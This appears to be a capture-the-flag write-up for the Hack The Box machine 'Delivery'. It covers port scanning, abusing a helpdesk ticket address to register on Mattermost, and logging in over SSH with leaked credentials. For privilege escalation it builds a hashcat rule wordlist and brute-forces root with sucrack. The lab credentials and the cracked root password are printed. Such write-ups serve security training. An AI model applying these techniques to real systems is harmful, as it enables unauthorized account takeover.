# Delivery

---

## Enumeration

- nmap:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c40fa859b01acac0ebc0c19518aee27 (RSA)
|   256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA)
|_  256 b79df7489da2f27630fd42d3353a808c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
8065/tcp open  unknown
```

- The website reveals its domain name and `helpdesk` subdomain
- Submitting a ticket:

```
test, 

You may check the status of your ticket, by navigating to the Check Status page using ticket id: 1387928.

If you want to add more information to your ticket, just email 1387928@delivery.htb.

Thanks,

Support Team
```

- The way this works it looks like, is the ticket can be updated by emailing `ticketID@delivery.htb` which means it's a valid email
- I used this email to register at mattermost on port 8065 and I got the verification message on the ticket page!
- Found creds message:

```
	
root
9:29 AM
@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail! 

Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

	
root
10:58 AM



PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```

- Used these creds `maildeliverer:Youve_G0t_Mail!` to login into the server via ssh and it worked, got user.txt

---

## Privilege Escalation

- The second message in mattermost gave a hint of a password that's `PleaseSubscribe!` variant, so I used hashcat to generate a wordlist of this password's variants that might be useful later on:

```zsh
┌──(kali㉿kali)-[~/CTF/HTB-CTF/Machines/Delivery]
└─$ nano wordlist.txt      

┌──(kali㉿kali)-[~/CTF/HTB-CTF/Machines/Delivery]
└─$ cat wordlist.txt 
PleaseSubscribe!

┌──(kali㉿kali)-[~/CTF/HTB-CTF/Machines/Delivery]
└─$ hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt > tmp
                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB-CTF/Machines/Delivery]
└─$ cat tmp > wordlist.txt 
                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB-CTF/Machines/Delivery]
└─$ hashcat --force --stdout -r /usr/share/hashcat/rules/toggles5.rule wordlist.txt > tmp
                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB-CTF/Machines/Delivery]
└─$ cat tmp > wordlist.txt 
```

- Used `sucrack` to crack root or mattermost account password and I got root password

```
     time elapsed:    00:00:00
   time remaining:    00:00:00
         progress:    81.39% [***************************************************************...............]
     user account:    root

 __dictionary:_______________________
        file size:    1177
       bytes read:    958
       words read:    60
 word buffer size:    40
    time/word add:    0.0000
         rewriter:    disabled

 __worker:___________________________
           worker:    20
         attempts:    0
  attempts/worker:    0
  seconds/attempt:    -nan
     attempts/sec:    -nan
  overhead/worker:    -nan

password is: PleaseSubscribe!21
```

---

